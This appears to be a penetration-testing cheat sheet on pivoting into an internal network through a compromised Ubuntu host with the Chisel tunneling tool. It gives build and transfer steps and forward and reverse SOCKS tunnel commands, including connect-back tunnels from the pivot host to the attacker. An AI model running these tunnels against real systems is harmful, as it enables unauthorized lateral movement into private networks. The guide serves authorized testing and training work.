**Overview:**
- Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data secured using SSH. It can create a client-server tunnel connection in firewall-restricted environments.
- In a typical pivot scenario, the attack host cannot directly reach an internal network (e.g. `172.16.5.0/23`). A compromised Ubuntu server acts as the pivot. Chisel is deployed on it to forward traffic to internal hosts such as a Domain Controller at `172.16.5.19`.
- When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed tunnels. The server listens and accepts connections, proxying them through the client. `R:socks` instructs the server to listen on the default SOCKS port (`1080`) and terminate the connection at the client's internal SOCKS5 proxy.
---
## Installation

```
git clone https://github.com/jpillora/chisel.git
```

Clone the repository on the attack host.

```
cd chisel && go build
```

Compile the binary.

```
scp chisel ubuntu@<target>:~/
```

Transfer the compiled binary to the pivot host.

---
## Forward Tunnel (Pivot Host as Server)

```
./chisel server -v -p 1234 --socks5
```

Run on the pivot host. Listens for incoming connections on port `1234`. `--socks5` enables SOCKS5 support, forwarding traffic to all networks reachable from the pivot host. `-v` verbose output.

```
./chisel client -v <target>:1234 socks
```

Run on the attack host. Connects to the Chisel server and creates a TCP/UDP tunnel via HTTP over SSH. Starts a local SOCKS5 listener on port `1080`.

```
tail -f /etc/proxychains.conf
```

Verify proxychains configuration. Ensure the following entry is present at the bottom of `/etc/proxychains.conf`:

```
socks5 127.0.0.1 1080
```

---
## Reverse Tunnel (Attack Host as Server)

```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Run on the attack host. `--reverse` enables reverse tunnel mode, allowing the client (pivot host) to initiate the connection and expose its internal network.

```
./chisel client -v <lhost>:1234 R:socks
```

Run on the pivot host. Connects back to the attack host. `R:socks` instructs the server to listen on the default SOCKS port (`1080`) and proxy traffic through the pivot host's internal network.

```
./chisel client -v <lhost>:1234 R:8888:127.0.0.1:8888
```

Run on the pivot host. Connects back to the attack-host. Used for port forwarding.